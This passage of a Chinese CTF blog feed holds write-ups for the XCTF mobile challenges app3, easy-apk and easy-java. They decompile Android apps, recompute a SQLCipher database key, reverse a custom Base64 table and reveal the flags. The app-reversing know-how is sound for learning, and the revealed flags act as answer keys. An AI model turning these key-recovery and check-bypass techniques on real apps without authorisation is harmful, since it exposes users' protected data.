class="string">&quot;pass&quot;</span>);</span><br><span class="line">            intent.setClass(<span class="keyword">this</span>, AnotherActivity.class);   <span class="comment">//将name和pass传递给AnotherActivity组件</span></span><br><span class="line">            startActivity(intent);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里重点分析这两行关键代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String a2 = aVar.a(contentValues.getAsString(<span class="string">&quot;name&quot;</span>), contentValues.getAsString(<span class="string">&quot;password&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">this</span>.a = <span class="keyword">this</span>.b.getWritableDatabase(aVar.a(a2 + aVar.b(a2,contentValues.getAsString(<span class="string">&quot;password&quot;</span>))).substring(<span class="number">0</span>, <span class="number">7</span>));</span><br></pre></td></tr></table></figure>

<p>上面的aVar类为<strong>com.example.yaphetshan.tencentwelcome.a</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.yaphetshan.tencentwelcome.a;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* compiled from: Cipher */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String a = <span class="string">&quot;yaphetshan&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">a</span><span class="params">(String str, String str2)</span> </span>&#123;</span><br><span class="line">        String substring = str.substring(<span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">return</span> substring + str2.substring(<span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    &#125;<span class="comment">//将str的前五个字符和str2的前五个字符进行拼接</span></span><br><span class="line">     </span><br><span class="line">    <span class="comment">//下面两个函数都调用了b这个类</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">b</span><span class="params">(String str, String str2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> b();</span><br><span class="line">        <span class="keyword">return</span> b.a(str); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">a</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> b();</span><br><span class="line">        <span class="keyword">return</span> b.b(str + <span class="keyword">this</span>.a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们继续分析b这个类，这个类就是对字符进行加密处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.yaphetshan.tencentwelcome.a;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* compiled from: SHA1Manager */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String <span class="title">a</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] cArr = &#123;<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>&#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = str.getBytes(); <span class="comment">//将str转换为字节数组</span></span><br><span class="line">            MessageDigest instance = MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">            instance.update(bytes);<span class="comment">//对字节数组进行md5处理</span></span><br><span class="line">            <span class="keyword">byte</span>[] digest = instance.digest();<span class="comment">//返回计算md5后的字符数组</span></span><br><span class="line">            <span class="keyword">int</span> length = digest.length;</span><br><span class="line">            <span class="keyword">char</span>[] cArr2 = <span class="keyword">new</span> <span class="keyword">char</span>[(length * <span class="number">2</span>)];</span><br><span class="line">            <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">byte</span> b : digest) &#123;</span><br><span class="line">                <span class="keyword">int</span> i2 = i + <span class="number">1</span>;</span><br><span class="line">                cArr2[i] = cArr[(b &gt;&gt;&gt; <span class="number">4</span>) &amp; <span class="number">15</span>];</span><br><span class="line">                i = i2 + <span class="number">1</span>;</span><br><span class="line">                cArr2[i2] = cArr[b &amp; <span class="number">15</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> String(cArr2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//b函数使用的是SHA-1摘要算法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String <span class="title">b</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] cArr = &#123;<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>&#125;;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = str.getBytes();</span><br><span class="line">            MessageDigest instance = MessageDigest.getInstance(<span class="string">&quot;SHA-1&quot;</span>);</span><br><span class="line">            instance.update(bytes);</span><br><span class="line">            <span class="keyword">byte</span>[] digest = instance.digest();</span><br><span class="line">            <span class="keyword">int</span> length = digest.length;</span><br><span class="line">            <span class="keyword">char</span>[] cArr2 = <span class="keyword">new</span> <span class="keyword">char</span>[(length * <span class="number">2</span>)];</span><br><span class="line">            <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">byte</span> b : digest) &#123;</span><br><span class="line">                <span class="keyword">int</span> i2 = i + <span class="number">1</span>;</span><br><span class="line">                cArr2[i] = cArr[(b &gt;&gt;&gt; <span class="number">4</span>) &amp; <span class="number">15</span>];</span><br><span class="line">                i = i2 + <span class="number">1</span>;</span><br><span class="line">                cArr2[i2] = cArr[b &amp; <span class="number">15</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> String(cArr2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>逆向还原得到写入的解密字符串，代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">app3</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        a str = <span class="keyword">new</span> a();</span><br><span class="line">        String str1 = str.a(<span class="string">&quot;Stranger&quot;</span>,<span class="string">&quot;123456&quot;</span>);</span><br><span class="line">        String str2 = str.a((str1+str.b(str1,<span class="string">&quot;123456&quot;</span>))).substring(<span class="number">0</span>,<span class="number">7</span>);</span><br><span class="line">        System.out.println(str2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>计算出如下密码字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ae56f99</span><br></pre></td></tr></table></figure>

<p>程序接下来使用SqlCipher对数据库文件进行加密处理，这里使用工具查看经过SQLite处理后的数据库文件Encryto.db,使用上面的密码打开数据库，可以看到里面存储的字段，这里有个Flag字段**”VGN0ZntIM2xsMF9Eb19ZMHVfTG92M19UZW5jM250IX0&#x3D;”**</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Bapp3/image-20231027095825065.png" class title="image-20231027095825065">



<p>这里的Flag字符串推测进行了Base64编码，对其进行解码处理得到原始字符串<strong>Tctf{H3ll0_Do_Y0u_Lov3_Tenc3nt!}</strong></p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Bapp3/image-20231027100032768.png" class title="image-20231027100032768">
]]></content>
      <categories>
        <category>CTF</category>
        <category>Mobile</category>
      </categories>
      <tags>
        <tag>-CTF -Mobile</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Moblie系列之easy-apk</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Beasy-apk/</url>
    <content><![CDATA[<h1 id="【攻防世界】Mobile系列之easy-apk"><a href="#【攻防世界】Mobile系列之easy-apk" class="headerlink" title="【攻防世界】Mobile系列之easy-apk"></a>【攻防世界】Mobile系列之easy-apk</h1><img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Beasy-apk/image-20231027142631739.png" class title="image-20231027142631739">

<p>反编译定位MainActivity入口，观察其代码逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.support.v7.app.AppCompatActivity, android.support.v4.app.SupportActivity, android.support.v4.app.FragmentActivity</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        ((Button) findViewById(R.id.button)).setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="comment">/* class com.testjava.jack.pingan1.MainActivity.AnonymousClass1 */</span></span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">new</span> Base64New().Base64Encode(((EditText) MainActivity.<span class="keyword">this</span>.findViewById(R.id.editText)).getText().toString().getBytes()).equals(<span class="string">&quot;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&quot;</span>)) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;验证通过!&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>, <span class="string">&quot;验证失败!&quot;</span>, <span class="number">1</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>验证判断关键代码如下，通过对输入的字符串进行处理后与给定的字符串进行对比</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new Base64New().Base64Encode(((EditText) MainActivity.this.findViewById(R.id.editText)).getText().toString().getBytes()).equals(&quot;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&quot;)</span><br></pre></td></tr></table></figure>

<p>接下来的关键就是对Base64Encode()进行逆向</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.testjava.jack.pingan1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Base64New</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">char</span>[] Base64ByteToStr = &#123;<span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>&#125;;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> RANGE = <span class="number">255</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] StrToBase64Byte = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">Base64Encode</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> </span>&#123;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= bytes.length - <span class="number">1</span>; i += <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] enBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">byte</span> tmp = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= <span class="number">2</span>; k++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i + k &lt;= bytes.length - <span class="number">1</span>) &#123;</span><br><span class="line">                    enBytes[k] = (<span class="keyword">byte</span>) (((bytes[i + k] &amp; <span class="number">255</span>) &gt;&gt;&gt; ((k * <span class="number">2</span>) + <span class="number">2</span>)) | tmp);</span><br><span class="line">                    tmp = (<span class="keyword">byte</span>) ((((bytes[i + k] &amp; <span class="number">255</span>) &lt;&lt; (((<span class="number">2</span> - k) * <span class="number">2</span>) + <span class="number">2</span>)) &amp; <span class="number">255</span>) &gt;&gt;&gt; <span class="number">2</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    enBytes[k] = tmp;</span><br><span class="line">                    tmp = <span class="number">64</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            enBytes[<span class="number">3</span>] = tmp;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k2 = <span class="number">0</span>; k2 &lt;= <span class="number">3</span>; k2++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (enBytes[k2] &lt;= <span class="number">63</span>) &#123;</span><br><span class="line">                    res.append(Base64ByteToStr[enBytes[k2]]);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    res.append(<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对Base64进行解码操作的话，按照base64编码流程反推即可，代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">app_apk</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">char</span>[] Base64ByteToStr = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> RANGE = <span class="number">255</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] StrToBase64Byte;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        Base64ByteToStr = <span class="keyword">new</span> <span class="keyword">char</span>[]&#123;<span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span>&#125;;</span><br><span class="line">        StrToBase64Byte = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">128</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span> <span class="title">getIndex</span><span class="params">(<span class="keyword">char</span> x)</span><span class="comment">//返回在码表中的位置</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span> index = -<span class="number">1</span>;</span><br><span class="line">        String table = <span class="keyword">new</span> String(Base64ByteToStr);</span><br><span class="line">        <span class="keyword">if</span>(x!=<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            index = (<span class="keyword">byte</span>)table.indexOf(x);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            index = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> index;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Base64Decode</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        String enflag = <span class="string">&quot;5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs=&quot;</span>;</span><br><span class="line">        String flag = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        String flag_temp = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;enflag.length();i+=<span class="number">4</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            String enf = enflag.substring(i,i+<span class="number">4</span>);</span><br><span class="line">            <span class="keyword">byte</span> flag1= (<span class="keyword">byte</span>)((getIndex(enf.charAt(<span class="number">0</span>)) &amp; <span class="number">255</span>) &lt;&lt;<span class="number">2</span> |(((getIndex(enf.charAt(<span class="number">1</span>)))&amp;<span class="number">255</span>) &gt;&gt;&gt;<span class="number">4</span>));</span><br><span class="line">            <span class="keyword">byte</span> flag2 = (<span class="keyword">byte</span>)((getIndex(enf.charAt(<span class="number">1</span>)) &amp; <span class="number">255</span>) &lt;&lt;<span class="number">4</span>|((getIndex(enf.charAt(<span class="number">2</span>)) &amp; <span class="number">255</span>) &gt;&gt;&gt; <span class="number">2</span> ));</span><br><span class="line">            <span class="keyword">byte</span> flag3 = (<span class="keyword">byte</span>) (((getIndex(enf.charAt(<span class="number">2</span>)) &amp; <span class="number">255</span>) &lt;&lt; <span class="number">6</span> )|((getIndex(enf.charAt(<span class="number">3</span>))&amp;<span class="number">255</span>)));</span><br><span class="line"></span><br><span class="line">            flag_temp = <span class="string">&quot;&quot;</span> +(<span class="keyword">char</span>)flag1+(<span class="keyword">char</span>)flag2+(<span class="keyword">char</span>)flag3;</span><br><span class="line">            flag += flag_temp;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(flag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Base64Decode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到原来的字符串为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">05397c42f9b6da593a3644162d36eb01 </span><br></pre></td></tr></table></figure>

<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Beasy-apk/image-20231027191515172.png" class title="image-20231027191515172">]]></content>
      <categories>
        <category>CTF</category>
        <category>Mobile</category>
      </categories>
      <tags>
        <tag>-CTF -Mobile</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Moblie系列之easy-java</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Beasy-java/</url>
    <content><![CDATA[<h1 id="【攻防世界】Mobile系列之easy-java"><a href="#【攻防世界】Mobile系列之easy-java" class="headerlink" title="【攻防世界】Mobile系列之easy-java"></a>【攻防世界】Mobile系列之easy-java</h1><img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Mobile%E7%B3%BB%E5%88%97%E4%B9%8Beasy-java/image-20231031103438040.png" class title="image-20231031103438040">

<p>反编译后获取源代码，下面一行代码为app判断语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (MainActivity.b(((EditText) ((MainActivity) this).findViewById(R.id.edit)).getText().toString()).booleanValue()</span><br></pre></td></tr></table></figure>

<p>这里调用b()对输入框字符串进行检验，继续跟进b()，代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">char</span> <span class="title">a</span><span class="params">(String str, b bVar, a aVar)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> aVar.a(bVar.a(str));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Boolean <span class="title">b</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!str.startsWith(<span class="string">&quot;flag&#123;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;<span class="comment">//检查前缀</span></span><br><span class="line">        <span class="keyword">if</span> (!str.endsWith(<span class="string">&quot;&#125;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;<span class="comment">//检查后缀</span></span><br><span class="line">        String substring = str.substring(<span class="number">5</span>, str.length() - <span class="number">1</span>);<span class="comment">//截取字符串[5,lebgth()-1]长度字符串</span></span><br><span class="line">        b bVar = <span class="keyword">new</span> b(<span class="number">2</span>);</span><br><span class="line">        a aVar = <span class="keyword">new</span> a(<span class="number">3</span>);</span><br><span class="line">    <span class="comment">//这两行调用了b()和a()</span></span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i2 = <span class="number">0</span>; i2 &lt; substring.length(); i2++) &#123;</span><br><span class="line">            sb.append(a(substring.charAt(i2) + <span class="string">&quot;&quot;</span>, bVar, aVar));</span><br><span class="line">            Integer valueOf = Integer.valueOf(bVar.b().intValue() / <span class="number">25</span>);</span><br><span class="line">            <span class="keyword">if</span> (valueOf.intValue() &gt; i &amp;&amp; valueOf.intValue() &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//对输入字符串经过一系列处理后与&quot;wigwrkaugala&quot;作对比</span></span><br><span class="line">        <span class="keyword">return</span> 